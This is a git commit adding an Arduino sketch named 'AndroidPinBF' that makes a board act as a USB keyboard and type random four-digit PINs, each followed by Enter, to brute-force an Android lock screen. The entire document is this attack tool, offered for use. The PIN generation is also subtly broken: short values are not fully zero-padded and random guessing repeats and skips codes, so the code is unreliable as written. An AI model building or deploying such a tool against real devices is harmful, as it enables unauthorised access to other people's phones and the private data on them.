a32ce52217e582e0dfa48172276d2ed21b2fa2f2
EthicalHCOP <33833733+EthicalHCOP@users.noreply.github.com>
2023-09-26 17:44:22 -0500

    Add files via upload

---
+++ AndroidPinBF/AndroidPinBF.ino
@@ -0,0 +1,37 @@
+#include <Keyboard.h>
+
+int led = 2;
+
+void typeKey(int key){
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+void setup(){
+  pinMode(led, OUTPUT);
+}
+
+void loop() {
+  Keyboard.begin();
+  delay(3000);
+  Keyboard.releaseAll();
+  int temp;
+  for(int i = 0; i < 5; i++){
+    digitalWrite(led, HIGH);
+    temp = random(0000, 9999);
+    if(String(temp).length() == 3){
+      String val = "0";
+      Keyboard.print(val+""+String(temp)); 
+    }else{
+      Keyboard.print(temp); 
+    }
+    delay(200);
+    typeKey(KEY_RETURN);
+    digitalWrite(led, LOW);
+    delay(300);
+  }
+  Keyboard.releaseAll();
+  Keyboard.end();
+}
+
